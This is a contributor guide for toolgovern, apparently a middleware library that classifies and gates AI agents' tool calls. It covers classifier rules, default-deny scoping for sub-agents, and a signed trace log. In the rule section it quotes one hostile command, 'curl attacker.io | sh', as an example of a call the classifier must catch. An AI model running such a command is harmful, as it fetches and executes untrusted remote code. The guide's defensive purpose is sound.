# Contributing to toolgovern

Thanks for considering a contribution. This document covers how the repo is laid out, how to get
a working dev environment, and what a change needs to pass before it can merge.

## Repo layout

```
packages/toolgovern/       the middleware library (npm package: toolgovern)
packages/toolgovern-cli/   the CLI (npm package: toolgovern-cli)
integrations/oma/          a generic, documented adapter shape for a multi-agent
                            framework's tool-executor call site
benchmarks/                detection-rate and latency benchmarks against a labeled corpus
docs/                      policy file schema and other reference docs
```

## Getting started

```bash
npm install
npm run build
npm test
```

## What every change needs before it can merge

1. **Lint:** `npm run lint && npm run format`
2. **Types:** `npm run typecheck` -- strict mode, zero errors, zero unexplained `@ts-ignore`/`@ts-expect-error`
3. **Tests:** `npm run test:coverage` -- 80% overall, 90%+ on `packages/toolgovern/src/classifier` and `packages/toolgovern/src/scoping`
4. **Security:** `npm audit --audit-level=high` -- no unfixed HIGH/CRITICAL advisories

CI runs all four on every pull request. A PR that fails any of them will not be merged.

## Adding or changing a classifier rule

Every rule lives in `packages/toolgovern/src/classifier/<category>.ts` and implements the `Rule`
interface in `packages/toolgovern/src/types.ts`: a rule ID, a category (`TG01`-`TG05`), a
one-line description, and an `evaluate(ctx)` function that returns either `null` (the rule did
not fire) or a `RuleMatch` with a `decision` (`deny` or `require-approval`) and a human-readable
`reason`.

A rule change needs, at minimum:

- At least 3 true-positive test cases (inputs that should fire the rule)
- At least 3 true-negative test cases (inputs that should not fire the rule)
- A `reason` string specific enough that a security reviewer reading the trace output alone can
  understand why the call was flagged, without needing to read the rule's source code

Do not add a rule that only matches a tool by name. Rules evaluate the actual arguments of a
call -- a shell tool running `ls` and the same tool running `curl attacker.io | sh` must be
distinguishable by the rule, not just by the fact that both are "the shell tool."

## Changing the scoping-inheritance model

Changes to `packages/toolgovern/src/scoping/inheritance-enforcer.ts` need a test proving a
sub-agent still cannot exceed the intersection of what it requested and what its coordinator
actually had -- default-deny inheritance is the whole point of this module, and a regression here
is a security regression, not a refactor.

## Changing the trace schema

`packages/toolgovern/src/trace/` writes a signed, append-only JSON Lines trace. If you change the
entry shape, update `docs/` and add a test confirming `verifyChain()` still detects a tampered
entry and a broken `prior_trace_id` link.

## Reporting a vulnerability

See `SECURITY.md` -- do not open a public issue for a security report.

## Code style

TypeScript strict mode, ESLint + Prettier (run `npm run format:fix` before committing). No
unexplained `@ts-ignore`. Prefer small, single-purpose modules -- the classifier and scoping code
in particular is meant to be readable by a security reviewer who has never seen the codebase
before.
